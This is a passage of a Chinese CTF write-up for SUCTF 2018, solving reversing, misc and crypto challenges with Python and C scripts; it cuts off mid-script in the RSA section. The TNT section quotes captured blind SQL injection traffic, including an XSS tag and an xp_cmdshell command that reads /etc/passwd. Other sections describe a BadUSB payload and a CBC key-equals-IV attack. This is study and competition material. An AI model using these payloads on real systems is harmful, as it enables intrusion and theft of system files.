									answer = (char *)rc4_crypt((unsigned char *)iv, cipher, 36);
									if (strncmp((const char*)answer, "SUCTF", 5) == 0 || strncmp((const char*)answer, "suctf", 5) == 0)
									{
										printf("%s\n", answer);
									}
								}
							}
						}
					}
				}
			}
		}
	}
	
	
	system("pause");
	return 0;
}

//SUCTF{d0_y0u_Th3_c4T60n_&rc4_oPc0de}
```
## engima
程序公有三个函数对输入进行处理。均为一对一的加密。字节直接没有相互影响
回头想侧信道可做:(，当时没想到。复现算法后爆破即可得到flag。
```python=
from struct import pack,unpack

def b2i(b):
	return unpack('I',b)[0]

def i2b(i):
	return pack('I',i)

# real target
target = [0xd9af1ca8,0x2ac6c00,0x68e3059b,0x3a78c72f,0xb9bfbc02,0x6e7d1c4d,0x849b1b31,0x760084d4,0x75064d5a]
# for test
# target = [0x5d5f3b12,0x4947a650,0x3ac037b3,0x787a87b9,0x4b9f8e8e,0x5c3d37df,0x2f5b58f1,0x6d1c6ebf,0x7ed63570]
xor = [0x2f9bacef,0x97cdd677,0x4be6eb3b,0xa5f3759d,0xD2F9BACE,0x697CDD67,0xB4BE6EB3,0x5A5F3759,0x2D2F9BAC]

def ByteXor():
	global target
	for i in range(len(target)):
		target[i] ^= xor[i]

def engima2(tmp):
	global target
	for i in range(3):
		# 1
		v0 = (tmp>>i)&1
		v1 = (tmp>>(7-i))&1
		if v0!=v1:
			v1 = 1
		else:
			v1 = 0

		if v1:
			tmp |= 1<<i
		else:
			tmp &= ~((1<<i)&0xff)

		# 2
		v0 = (tmp>>(7-i))&1
		v1 = (tmp>>i)&1
		if v0!=v1:
			v1 = 1
		else:
			v1 = 0
		
		if v1:
			tmp |= 1<<(7-i)
		else:
			tmp &= ~((1<<(7-i))&0xff)

		# 3
		v0 = (tmp>>i)&1
		v1 = (tmp>>(7-i))&1
		if v0!=v1:
			v1 = 1
		else:
			v1 = 0
		if v1:
			tmp |= 1<<i
		else:
			tmp &= ~((1<<i)&0xff)
	return tmp

def bruteStep2():
	global target
	t = []
	for i in range(9):
		tt = ''
		tmp = i2b(target[i])
		for j in range(4):
			for m in range(0x100):
				if ord(tmp[j]) == engima2(m):
					tt += chr(m)
					# print i*4+j,m
					break
		t.append(b2i(tt))
	target = t[:]

def engima1(tmp,a,b,c):
	key1 = [0x31,0x62,0x93,0xc4]
	key2 = [0x21,0x42,0x63,0x84]
	key3 = [0x3d,0x7a,0xb7,0xf4]
	t = 0
	for i in range(8):
		v4 = (tmp>>i)&1
		v5 = (key1[a]>>i)&1
		flag = t^v5^v4
		t = v5 & v4 | t & (v5 | v4)

		if flag!=0:
			tmp |= 1<<i
		else:
			tmp &= ~((1<<i)&0xff)

	for i in range(8):
		v4 = (tmp>>i)&1
		v5 = (key2[b]>>i)&1
		flag = t^v5^v4
		t = v5 & v4 | t & (v5 | v4)

		if flag!=0:
			tmp |= 1<<i
		else:
			tmp &= ~((1<<i)&0xff)

	for i in range(8):
		v4 = (tmp>>i)&1
		v5 = (key3[c]>>i)&1
		flag = t^v5^v4
		t = v5 & v4 | t & (v5 | v4)

		if flag!=0:
			tmp |= 1<<i
		else:
			tmp &= ~((1<<i)&0xff)
	return tmp

def bruteStep1():
	global target
	a = 0
	b = 0
	c = 0
	ans = ''
	for i in range(9):
		tmp = i2b(target[i])
		for j in tmp:
			for m in range(0x100):
				if ord(j) == engima1(m,a,b,c):
					ans += chr(m)
					a += 1
					if a==4:
						a = 0
						b += 1
					if b==4:
						b = 0
						c += 1
					if c==4:
						c = 0
					break
	return ans

ByteXor()
bruteStep2()
print bruteStep1()
```
flag : `SUCTF{sm4ll_b1ts_c4n_d0_3v3rythin9!}`

## rubberDucky

badusb的题目，在HITB2018上的hex就是一道badusb的题目，这道题目同理，只是逻辑改变了，先hex2bin，arduino micro板子使用的是atmega32u4，编译器是arduino avr，在逆向时我选择了atmega32_L，程序的大致功能就是运行rundll32 url.dll,0penURL xxxxxxxxxx，从一个url上获取数据，我们只要获得这串url即可，脚本如下：
```python=
#!/usr/bin/env python2
#-*- coding:utf-8 -*-
import string


guess = [0x25,0x16,0x09,0x07,0x63,0x62,0x68,0x1B,0xf,0x4E,0x12,0x7,0x24,0x1b,0xb,0x61,0x1A,0x17,0x46,0x11,0x6,0x1,0x18,0x1f,0x39,0xd,0x25,0x1b,0x53,0x16,0x9,0x3,0x5F,0x24,0x36,0x30,0x44,0xd,0x14,0x41,0x60,0x08,0x20,0x28,0x36,0x39,0x18,0x37,0x2e,0x49,0x1e,0x01,0x06]
cipher = 'MasterMeihasAlargeSecretGardenfortHeTeamSU,canUfindit'



ans = ''
for i in range(len(cipher)):
	tmp = chr((((guess[i]-i%10)&0xff)^ord(cipher[i])))
	ans += tmp
print ans
```
得到http://qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip。
解压得到的程序是一个pyinstaller打包的程序，使用pyinstxtractor解包，得到其的pyc文件，pyc文件缺失文件头标志和时间戳，补上即可，时间戳可以随意，我是用自己编译pyc文件的时间戳，使用uncompyle2即可得到py文件如下：
```python=
# 2018.05.27 18:53:29 ÖÐ¹ú±ê×¼Ê±¼ä
#Embedded file name: RubberDucky.py
import os
import time
print '#####   #     #                                                 #####                                     '
print '#     # #     #     ####  ######  ####  #####  ###### #####    #     #   ##   #####  #####  ###### #    # '
print '#       #     #    #      #      #    # #    # #        #      #        #  #  #    # #    # #      ##   # '
print ' #####  #     #     ####  #####  #      #    # #####    #      #  #### #    # #    # #    # #####  # #  # '
print '      # #     #         # #      #      #####  #        #      #     # ###### #####  #    # #      #  # # '
print '#     # #     #    #    # #      #    # #   #  #        #      #     # #    # #   #  #    # #      #   ## '
print ' #####   #####      ####  ######  ####  #    # ######   #       #####  #    # #    # #####  ###### #    # '
introduction = 'Je suis la garde du jardin'
question = 'Donnez-moi FLAG avant de pouvoir y aller'
time.sleep(2)
os.system('cls')
print 'Garde:' + introduction
time.sleep(2)
print 'Garde:' + question
time.sleep(2)
flag = ''
b = ''
cipher = 'YVGQF|1mooH.hXk.SebfQU`^WL)J[\\(`'
flag = raw_input('You:')
if len(flag) != 32:
    print 'It has 32 words'
    os.system('exit')
for i in range(len(flag)):
    b += chr(ord(flag[i]) + ord(flag[i]) % 4 * 2 - i)

if b == cipher:
    print 'Garde:' + 'Correct flag! Welcome my friend, Meizijiu Shifu appreciates your visiting here!'
else:
    print 'Garde:' + 'Noooo!Stranger!!Get out!'
+++ okay decompyling test.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2018.05.27 18:53:29
```
写解密脚本:
```python=
#!/usr/bin/env python2
#-*- coding:utf-8 -*-

import string

table = string.printable
cipher = 'YVGQF|1mooH.hXk.SebfQU`^WL)J[\\(`'
ans = ''

for group in range(len(cipher)):
	for ch in table:
		tmp = ord(ch) + (ord(ch) % 4) * 2 - group
		if tmp < 127:
			if chr(tmp) == cipher[group]:
				ans += ch
				break
print ans

#SUCTF{5tuxN3t_s7arts_from_A_usB}
```



## RoughLike与期末大作业

> 这 Writeup 写得我有点虚

解压题目压缩包后，在img文件夹下发现两个文件 `rev1.png` ` rev2.png`  
仔细观察图片中的文字，理解其中的奥妙，得到如下：

```
V2VMQzBtRQ== // WeLC0mE
_70_5uc7F
```

进一步得到 flag `SUCTF{WeLC0mE_70_5uc7F}`

# Misc

## 签到
BASE32
在线解密得到flag `SUCTF{welcome_to_suctf2018}`

## TNT

题目中给了一个抓包文件，分析后发现是 SQL 基于时间的盲注攻击流量。  
使用 wireshark 对流量元数据进行导出，并使用脚本处理元数据。  
导出数据样例与脚本如下：

``` csv
"No.","Time","Source","Destination","Protocol","Length","WPA Key Data","Info"
"4","0.000609","192.168.154.156","192.168.36.113","HTTP","621","","GET /vulnerabilities/sqli_blind/?id=2&Submit=Submit HTTP/1.1 "
"6","0.002980","192.168.36.113","192.168.154.156","HTTP","1761","","HTTP/1.1 200 OK  (text/html)"
"20","0.072089","192.168.154.156","192.168.36.113","HTTP","887","","GET /vulnerabilities/sqli_blind/?id=2&Submit=Submit&CLDt%3D8153%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 "
"22","0.073773","192.168.36.113","192.168.154.156","HTTP","1761","","HTTP/1.1 200 OK  (text/html)"
"30","0.986629","192.168.154.156","192.168.36.113","HTTP","621","","GET /vulnerabilities/sqli_blind/?id=2&Submit=Submit HTTP/1.1 "
"32","0.988278","192.168.36.113","192.168.154.156","HTTP","1761","","HTTP/1.1 200 OK  (text/html)"
"40","0.998146","192.168.154.156","192.168.36.113","HTTP","624","","GET /vulnerabilities/sqli_blind/?id=4406&Submit=Submit HTTP/1.1 "
"42","0.999979","192.168.36.113","192.168.154.156","HTTP","1756","","HTTP/1.1 200 OK  (text/html)"
"50","1.009085","192.168.154.156","192.168.36.113","HTTP","645","","GET /vulnerabilities/sqli_blind/?id=2%22%28%27%29%29%29%2C...&Submit=Submit HTTP/1.1 "
"52","1.010705","192.168.36.113","192.168.154.156","HTTP","1756","","HTTP/1.1 200 OK  (text/html)"
"60","1.018100","192.168.154.156","192.168.36.113","HTTP","648","","GET /vulnerabilities/sqli_blind/?id=2%27yQMrNJ%3C%27%22%3EZMZFjB&Submit=Submit HTTP/1.1 "
"62","1.019676","192.168.36.113","192.168.154.156","HTTP","1756","","HTTP/1.1 200 OK  (text/html)"
```

``` python
import csv, re
import urllib
import sys

rows = []
id_to_print = []

def loadfile(filename):
    with open(filename, 'rb') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            if row['Source'] != "192.168.36.113":
                row['Flag'] = 'False'
                rows.append(row)

def dumpinfo():
    for i in range(len(rows)):
        if rows[i]['Source'] != "192.168.36.113":
            print rows[i]['Flag'], urllib.unquote(rows[i]['Info'])[37:]

def checktrue():
    for i in range(1, len(rows)):
        if float(rows[i]['Time']) - float(rows[i-1]['Time']) > 0.8:
            rows[i-1]['Flag'] = 'True '

def printnteq(start=0, end=len(rows)):
    for r in range(len(rows)):
        if rows[r]['Flag'] == 'True':
            continue
        m = re.search(r"!=(\d+)", urllib.unquote(rows[r]['Info']))
        if m is not None:
            sys.stdout.write(hex(int(m.group(1)))[2:])

def main():
    loadfile('csv')
    checktrue()
    printnteq(1053,6370)

if __name__ == "__main__":
    main()
```

导出数据后得到一个 base64

```
QlpoOTFBWSZTWRCesQgAAKZ///3ry/u5q9q1yYom/PfvRr7v2txL3N2uWv/aqTf7ep/usAD7MY6NHpAZAAGhoMjJo0GjIyaGgDTIyGajTI0HqAAGTQZGTBDaTagbUNppkIEGQaZGjIGmgMgMjIyAaAPU9RpoMjAjBMEMho0NMAjQ00eo9QZNGENDI0zUKqflEbU0YhoADQDAgAaaGmmgwgMTE0AGgAyNMgDIGmTQA0aNGg0HtQQQSBQSMMfFihJBAKBinB4QdSNniv9nVzZlKSQKwidKifheV8cQzLBQswEuxxW9HpngiatmLK6IRSgvQZhuuNgAu/TaDa5khJv09sIVeJ/mhAFZbQW9FDkCFh0U2EI5aodd1J3WTCQrdHarQ/Nx51JAx1b/A9rucDTtN7Nnn8zPfiBdniE1UAzIZn0L1L90ATgJjogOUtiR77tVC3EVA1LJ0Ng2skZVCAt+Sv17EiHQMFt6u8cKsfMu/JaFFRtwudUYYo9OHGLvLxgN/Sr/bhQITPglJ9MvCIqIJS0/BBxpz3gxI2bArd8gnF+IbeQQM3c1.M+FZ+E64l1ccYFRa26TC6uGQ0HnstY5/yc+nAP8Rfsim4xoEiNEEZclCsLAILkjnz6BjVshxBdyRThQkBCesQg=
```

位置为 565 处有一个`.` 根据题目提示，此处需要爆破，使用如下脚本爆破所有可能性并尝试解压，如果解压成功则代表爆破成功。

``` python
import base64, string, os

b64alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'

def main():
    with open('comment.bin', 'r') as f:
        b64en = f.read()
    for i in b64alphabet:
        b64corr = b64en.replace('.', i)
        with open('tmp.bz2', 'wb') as bzf:
            bzf.write(base64.b64decode(b64corr))
        ret = os.system('bzip2 -d tmp.bz2')
        if ret == 0:
            raw_input()

if __name__ == "__main__":
    main()
```

压缩包地狱，疯狂修正文件头：

| Name   | Realtype | Command             |
| ------ | -------- | ------------------- |
| tmp    | gzip     | `binwalk -e tmp`    |
| 33.333 | zip      | `binwalk -e 33.333` |
| 22222  | Rar!     | `binwalk -e 22222`  |

得到最终文件 `common` : `suctf{233333th1s1sf1ag23333333333333333}`

## Cycle

根据字母和空格异或会得到字母的对应大/小写，已知flag里为纯英文，循环长度2到49判断cipher中出现字母所在位置对长度求余重复率最大的长度值，得出flag长24，再根据24长度下cipher里面字母出现位置的概率得出flag
```python
#import flag
import copy
def encryt(key, plain):
    cipher = ""
    for i in range(len(plain)):
        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))
    return cipher

def getPlainText():
    plain = ""
    with open("plain.txt") as f:
        while True:
            line = f.readline()
            if line:
                plain += line
            else:
                break
    return plain

def main():
    key = flag.flag
    assert key.startswith("flag{")
    assert key.endswith("}")
    key = key[5:-1]
    assert len(key) > 1
    assert len(key) < 50
    assert flag.languageOfPlain == "English"
    plain = getPlainText()
    cipher = encryt(key, plain)
    with open("cipher.txt", "w") as f:
        f.write(cipher.encode("base_64"))

#if __name__ == "__main__":
   #main()
#27
#SomethingsJustgLikeoThis
result = dict()
with open('cipher.txt','r') as f:
    text = f.read()
    #print text
    text = text.decode('base_64')
    for i in range(len(text)):
        if (ord(text[i])>=ord('a') and ord(text[i])<=ord('z')) or (ord(text[i])>=ord('A') and ord(text[i])<=ord('Z')):
            if text[i] in result:
                tmp = result[text[i]]
                tmp.append(i)
                result[text[i]]=tmp
            else:
                result[text[i]]=[i]
list2 = dict()
choice =[65535,0]
for i in range(24,25):
    length = i
    flag=['0']*length
    tmplength = 0
    for j in result:
        tmplist = result[j]
        tmpresult = []
        for k in tmplist:
            tmpflag = copy.deepcopy(flag)
            tmpresult.append(k%length)
        #tmpresult = list(set(tmpresult))
        tmpresult.sort()
        tmplength+=len(tmpresult)
        print tmpresult
        print j,'finished'
    print i,'finished'
'''tmpflag[k%length]=j
            num = 0
            for l in tmplist:
                if t nmpflag[l%length]==j:
                    num+=1
            if float(num)/len(tmplist)>0.4:
                if k%length in list2:
                    if list2[k%length]<float(num)/len(tmplist):
                        list2[k%length]=float(num)/len(tmplist)
                        flag[k%length]=j
                else:
                    list2[k%length]=float(num)/len(tmplist)
                    flag[k%length]=j
result1 = ''
    num2 = 0
    for d in flag:
        if d=='0':
            result1+=d
            num2 +=1
        elif ord(d)>ord('a'):
            result1+=chr(ord(d)-32)
        else:
            result1+=chr(ord(d)+32)
    print result1
    if float(num2)/i<0.5:
        print encryt(result1,text) 
        print i,result1'''
print encryt('Something Just Like This',text)
'''for i in range(65,91):
    for j in range(65,91):
        flag = 'SomethingsJust'+chr(i)+'Like'+chr(j)+'This'
        print encryt(flag,text)
        print chr(i),chr(j),'finished'''
#print chr(ord('s')^ord(text[9]))

```
得出的flag为SomethingxJustxLikexThis,中间三个位置可以通过cipher和明文异或得出，都为空格
所以flag为 `flag{Something Just Like This}`

## SandGame

中国剩余定理
```
from functools import reduce


def egcd(a, b):
    if 0 == b:
        return 1, 0, a
    x, y, q = egcd(b, a % b)
    x, y = y, (x - a // b * y)
    return x, y, q


def chinese_remainder(pairs):
    mod_list, remainder_list = [p[0] for p in pairs], [p[1] for p in pairs]
    mod_product = reduce(lambda x, y: x * y, mod_list)
    mi_list = [mod_product//x for x in mod_list]
    mi_inverse = [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))]
    x = 0
    for i in range(len(remainder_list)):
        x += mi_list[i] * mi_inverse[i] * remainder_list[i]
        x %= mod_product
    return x


if __name__=='__main__':
    a = [257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373]
    b = [222,203,33,135,203,62,227,82,239,82,11,220,74,92,8,308,195,165,87,4]
    ans = [(a[x],b[x]) for x in range(len(a)) ]
    print str(hex(chinese_remainder(ans)))[2:-1].decode('hex')
    
    #flag{This_is_the_CRT_xwg)}
```

## game

取石子的博弈论，一共有三次，第一名的手速真是快orz，比我这个第二快了一个多小时orz
定义概念 **奇异局势** 为，A面对此局势时，A先手必输的情况。我们的目标是将局势变为奇异局势给对方。
第一轮：奇异局势为 总数 % (1+上限) == 0 时。取法较为简单。
第二轮：奇异局势为 一个表【符合黄金分割比】。取法挺麻烦的，要提前打表。
第三轮：奇异局势为 五堆数量 取异或 == 0的情况。
博弈论很有趣~

代码如下：【注意，此代码中，第二轮使用的me表太大，不复制过来了】
```
import hashlib, re, time, socket, math

# 1 Socket Init
# 1.1 Set Host and Port
HOST, PORT = "game.suctf.asuri.org", int(10000)

# 1.2 Connect to Server
         
m = (1 + math.sqrt(5)) / 2.0

def judge(a, b):
    #a small
    k = a*1.0/m;  
    if a == int(k*m):  
        if b == a + k:  
            return k    
    elif a == int((k+1)*m):    
        if b == a + k + 1: 
            return k+1  
    return False
    
me = [] #第二轮奇异局势的表！！！！！！

my_dic = {}
for dui in me:
    my_dic[dui[0]] = dui[1]
    my_dic[dui[1]] = dui[0]
'''[[0,0]]
use = [0]
for i in range(1,80000):
    if i not in use:
        use += [i]
        j = i + len(me)
        me.append([i,j])
        use += [j]
print me
'''
#print me[:6]


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

# Junk
time.sleep(0.5)
res = sock.recv(2048)
print res
    
old = re.search(r'[0-9a-zA-Z]{12}', res).group(0)
ans = re.search(r'[0-9a-z]{64}', res).group(0)
print old, ans
result = ''
mydict = [chr(i) for i in range(ord('0'), ord('9')+1)] + [chr(i) for i in range(ord('a'), ord('z')+1)] + [chr(i) for i in range(ord('A'), ord('Z')+1)] + ['']
#print mydict
#mydict = [chr(i) for i in range(128)] + ['']
for a in mydict:
    for b in mydict:
        for c in mydict:
            for d in mydict:
                my_str = old + a+b+c+d
                #print my_str
                sha256 = hashlib.sha256()
                sha256.update(my_str.encode('ascii'))
                sha_256 = sha256.hexdigest()
                if sha_256 == ans:
                    result = a+b+c+d
                    break
            if result != '':
                break
        if result != '':
            break
    if result != '':
        break
print result
sendBuf = result + '\n'
sock.send(sendBuf)  



first = 1
flag = False
while 1:
    if flag:
        break
    if first:
        time.sleep(0.5)
        res = sock.recv(2048)
        print res

        if 'something difficult' in res:
                flag = True
                break
        if 'You win!' in res:
            break
        
    total = int(re.search(r'There are (\d+)', res).group(1))
    left = int(re.search(r'pick (\d+) - (\d+)', res).group(1))
    right = int(re.search(r'pick (\d+) - (\d+)', res).group(2))
    lo = int(re.search(r'(\d+) stones left', res).group(1))
    print total, left, right, lo

    if first == 1:
        first = 0

    if total % (left+right) == 0:
        sendBuf = 'GG\n'
        print sendBuf
        sock.send(sendBuf)
        first = 1
        continue
    else:
        sendBuf = str(total % (left+right)) + '\n'
        sock.send(sendBuf)

        time.sleep(0.15)
        res = sock.recv(2048)
        print res
        while 1:
            lo = int(re.search(r'I pick (\d+)!', res).group(1))
            sendBuf = str(left+right-lo)+'\n'
            sock.send(sendBuf)

            time.sleep(0.15)
            res = sock.recv(2048)
            print res

            if 'something difficult' in res:
                flag = True
                break
            if 'You win!' in res:
                break




while 1:
    if 'Incredible!' in res:
        break
    left = int(re.search(r'Piles: (\d+) (\d+)', res).group(1))
    right = int(re.search(r'Piles: (\d+) (\d+)', res).group(2))
    print left, right

    if [left, right] in me:
        sendBuf = 'GG\n'
        print sendBuf
        sock.send(sendBuf)
        time.sleep(0.15)
        res = sock.recv(2048)
        print res
        continue


    if left == right:
        sendBuf = str(left) + ' 2\n'
        sock.send(sendBuf)
        time.sleep(0.15)
        res = sock.recv(2048)
        print res
        continue

    sendBuf = ''
    if left < right:
        i = my_dic[left]
        if i < right:
            sendBuf = str(right-i) + ' 1\n'
        else:
            sendBuf = 0
            while 1:
                sendBuf += 1
                left -=1
                right -=1
                if my_dic[left] == right:
                    sendBuf = str(sendBuf) + ' 2\n'
                    break

    else:
        i = my_dic[right]
        if i < left:
            sendBuf = str(left-i) + ' 0\n'
        else:
            sendBuf = 0
            while 1:
                sendBuf += 1
                left -=1
                right -=1
                if my_dic[right] == left:
                    sendBuf = str(sendBuf) + ' 2\n'
                    break

    print '[send]'+sendBuf,
    sock.send(sendBuf)
    time.sleep(0.15)
    res = sock.recv(2048)
    continue

while 1:
    p1 = int(re.search(r'Piles: (\d+) (\d+) (\d+) (\d+) (\d+)', res).group(1))
    p2 = int(re.search(r'Piles: (\d+) (\d+) (\d+) (\d+) (\d+)', res).group(2))
    p3 = int(re.search(r'Piles: (\d+) (\d+) (\d+) (\d+) (\d+)', res).group(3))
    p4 = int(re.search(r'Piles: (\d+) (\d+) (\d+) (\d+) (\d+)', res).group(4))
    p5 = int(re.search(r'Piles: (\d+) (\d+) (\d+) (\d+) (\d+)', res).group(5))

    total = p1^p2^p3^p4^p5
    if total == 0:
        sendBuf = 'GG\n'
        print sendBuf
        sock.send(sendBuf)
        time.sleep(0.15)
        res = sock.recv(2048)
        print res
        continue

    else:
        if p1 > p1 ^ total:
            sendBuf = str(p1 - (p1 ^ total)) + ' 0\n'
        elif p2 > p2 ^ total:
            sendBuf = str(p2 - (p2 ^ total)) + ' 1\n'
        elif p3 > p3^total:
            sendBuf = str(p3 - (p3 ^ total)) + ' 2\n'
        elif p4 > p4^total:
            sendBuf = str(p4 - (p4 ^ total)) + ' 3\n'
        elif p5 > p5^total:
            sendBuf = str(p5 - (p5 ^ total)) + ' 4\n'

    print sendBuf,
    sock.send(sendBuf)
    time.sleep(0.14)
    res = sock.recv(2048)
    print res

```


# crypto

## enjoy

key和iv相同，构造C1ZC1的密文，其中Z为0，可以得到P1'=decr(C1)^iv，P3'=decr(C1)^0=decr(C1),所以P1'^P3'=iv,得出iv: iv=key_is_danger
```python
#coding: UTF-8
import socket
#import flag
from Crypto.Cipher import AES
import base64

def padding(message):
    toPadByte = 16 - len(message) % 16
    paddedMessage = message + chr(toPadByte) * toPadByte
    return paddedMessage

def encrypt(plain,flag):
    key = flag
    assert len(key) == 16
    iv = key
    plain = padding(plain)
    aes = AES.new(key, AES.MODE_CBC, iv)
    cipher = aes.encrypt(plain)
    cipher = cipher
    cipher = cipher.encode("base_64")
    return cipher

def runTheClient(flag):
    s = socket.socket()
    host = "game.suctf.asuri.org"  # set this to the host's IP address
    port = 10003
    plain = "aaaaI_enjoy_cryptographyaaaaaaaaaa"

    #cipher = encrypt(plain,flag)
    #cipher = ('\x00'*48).encode('base_64')
    cipher = flag
    cipher = cipher.encode('base_64')
    s.connect((host, port))
    s.send(cipher)
    line = (s.recv(1024).strip())
    print line 
    line = line.split('\n')[2]
    line = line.decode("base_64")  
    print len(line)
    s.close()
    return line

if __name__ == "__main__":
    flag="a"*16+'\x00'*16+'a'*16
    text = runTheClient(flag)
    p1 = text[:16]
    p3 = text[32:]
    print p1,p3
    iv = ''
    for i in range(len(p1)):
        iv +=chr(ord(p1[i])^ord(p3[i]))
    print iv
    #print s.recv(1024)
```
flag即为：`flag{iv=key_is_danger}`


## magic

这个叫不叫流密码？
和ciscn还是强网杯的题类似，mask改成了多组的magic。
整体操作是，记录明文和每一个magic数，异或后记录1的个数。
明文长为256bit，方程有255个，解同余方程组。
可以剪枝or高斯消元法。

代码需要github上一个叫 mod_equations的项目
```
from mod_equations import *
import numpy as np

flag = 'flag{xi}'

def getMagic():
    magic = []
    with open("magic.txt") as f:
        while True:
            line = f.readline()
            if (line):
                line = int(line, 16)
                magic.append(line)
                # print bin(line)[2:]
            else:
                break
    return magic

def playMagic(magic, key):
    cipher = 0
    for i in range(len(magic)):
        cipher = cipher << 1
        t = magic[i] & key
        c = 0
        while t:
            c = (t & 1) ^ c
            t = t >> 1
        cipher = cipher ^ c
    return cipher

def main():
    print flag
    key = flag[5:-1]
    assert len(key) == 2
    key = key.encode("hex")
    #print key
    key = int(key, 16)
    print bin(key)
    magic = getMagic()
    cipher = playMagic(magic, key)
    print cipher
    cipher = hex(cipher)[2:]
    print cipher
    with open("cipher.txt", "w") as f:
        f.write(cipher + "\n")



def my_decode():
    with open("cipher.txt", "r") as f:
        cipher = f.read()
    cipher = int(cipher,16)
    magic = getMagic()
    #print(len(magic))
    print 'cipher:',
    print bin(cipher)

    q = [[] for i in range(len(magic))]
    total = [0 for i in range(len(magic))]
    for op in range(len(magic)):
        num = magic[op]
        for i in range(len(magic)):
            if num & 1:
                q[op] += [1]
            else:
                q[op] += [0]
            num = num >> 1
        #q[op].reverse()
    q.reverse()

    ans = []
    num = cipher
    for i in range(len(magic)):
        if num & 1:
            ans += [1]
        else:
            ans += [0]
        num = num >> 1
    print 'ans:',
    print ans
    mod = 2
    solution = ans

    for op in range(len(magic)):
        q[op] += [ans[op]]

    matrix = q

    result = run_test(mod, solution, matrix)[0]
    result.reverse()
    result = [str(i) for i in result]
    result = ''.join(result)
    print str(hex(int(result,2)))[2:-1].decode('hex')


if __name__ == "__main__":
    #main()
    print '----'
    my_decode()
    

#flag{Now_you_know_the_Hill_Cipher_xwg}
```

## rsa

不难，能给的都给了，先求密文，再求明文，最后求的是 pow(c2, r ,n) 还是谁的逆元，记不住了。。
大家的手速都太鸡儿快了，写完就交才第四
```
from mod_equations import *

e=3
d=44099662569240083770100452501923890981810347032878178494549569926293640377794102787757812392102295343611476808834126649538952636114181616043006492565612847637935953145160211951331986860339486196832569683821120141014991379839508808414941455385036209313700326288366870889877799654511681743709353299322639045424737161223404842883211346043467541833205836604553399746326181139106884008412679110817142624390168364685584282908134947826592906891361640349523847551416712367526240125746834000852838264832774661329773724115660989856782878284849614002221996848649738605272015463464761741155635215695838441165137785286974315511355
n=66149493853860125655150678752885836472715520549317267741824354889440460566691154181636718588153443015417215213251189974308428954171272424064509738848419271456903929717740317926997980290509229295248854525731680211522487069759263212622412183077554313970550489432550306334816699481767522615564029948983958568137620658877310430228751724173392407096452402130591891085563316308684064273945573863484366971922314948362237647033045688312629960213147916734376716527936706960022935808934003360529947191458592952573768999508441911956808173380895703456745350452416319736699139180410176783788574649448360069042777614429267146945551


test = []
test.append([10289147847644225568111699442081363109496045760315319609190602056382584879724664487265511688008527297877015738216848208470853059203269821159900939319274712149312949842572356954562754437659094224261503155724125691476391616347981344542447034204039119930030812010577601931347283588092508795851673074786380713793915076363687922469897511780034812071148090008974592250732484964619079002085914840726327333297504028612339759304494187238062416580301738001695551360041091893902503046116082582053474012962480785130754957509637496338822498618161478527576834224941015548415772621246917789505450119797237130354624653736246429528561,57892049922021528640615872149425017158933822678025820230773584410110177582188759114077278307487785217364330613048379102686379847841787610772262997577726899535810468273765786301313631587547447147168881223653761246470048249935011215474173179050646144962906795536721743135307879150338101824202580128368678570532562059290908433261305340977528587946410289841936962327906761264771641245860973183445520840656064891108786725121330397229688155139446500712759791674309746048388028623629114935308174045906806243037782421119379083280783752434962553429306151628602911900144720794894479735455983351311120424413874765415657532214664])

test.append([13100153824677134334379776994236572845830893336544080795142326963801624037620579598506605370716058890474876466268339478724366738268623448863870369390930422578869367385666662268317287141082751780895266922358041256471022093558396472847051653662043968103839484494846445497225120443301892766125315251182913440253006810482114429495009410956546230716230239206340618448887970496714652833587553162911825097243109230494990349856306565542400149148209647384182594436561397707224575389430214372455038174166190037497606621377593355058799941598932449281147219096722225105180136749410670205524041736021498368807942464982855116785624,29207298854929390140113285064673679979281492002887053208064788290825164683834337501622932682662530815111198419606720892430494248196836037089093934454325288941719554059829153839711567795435282059143224598467252830037617017086968543232957912518635884431219357390815311921021013418945396959582616849013863069032550554002326437290165403844426604881005398897117023546119992013528897541051392955951747920086382310723154647993212301068008075939027592371328172137087714229337209334644508603472231056249936794599465176662686644915787299105012259682667754470435772887686424889116329895956906054718661696283727760625317653213273])

test.append([50580420657757678491508731900924206624713261500965496564554052874999078177950316410342494107598860552278611258878784419786879584254249858458479504082635636751526791958941579577363187657554774433155839443641942941584937331264174432376365359971050875618407784628393350472795642831430059974256689407959561656160096827326894933800794665088293657557425958890261308478858575375561591037441025748679388311470353637187562978098572501782878734510059372789942625977661545919048784263187084896801051723793380256227508371604769428221970291038203856125593810789400999873263478966154725692536402155459951546847360434536212655035646,22877512441699440738457887002703590915307946160242812258933677314354231078506566379111270009346323463588137507796341251210943654124557727757795445026134732290436843152942983735798054158370428993407749879117958849092574026328116174668432210927673481165222974829277052187814213729467536174607301349478197798329089376114858304154101757946197514714480975352568927517019568522390505772337545580188503924061797453207903466023574078173841050339265727310705698133447123259725893413509837999137270684213809702871102698430008647451938020472528725305647064306573390104518029986549291217695249659859863107138705450062117814054707])

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def gcd(a, b):
	if a < b:
 		a, b = b, a

 	while b != 0:
 		temp = a % b
 		a = b
 		b = temp

 	return (a,b,1)

def modinv(a, m):
    g, x, y = gcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

def Exgcd(r0, r1): # calc ax+by = gcd(a, b) return x
    mod = r1
    x0, y0 = 1, 0
    x1, y1 = 0, 1
    x, y = r0, r1
    r = r0 % r1
    q = r0 // r1
    while r:
        x, y = x0 - q * x1, y0 - q * y1
        x0, y0 = x1, y1
        x1, y1 = x, y
        r0 = r1
        r1 = r
        r = r0 % r1
        q = r0 // r1
    return x%mod

#c2 = (pow(r, e, n) * c) % n

s = pow(test[1][1],e,n)
#print s
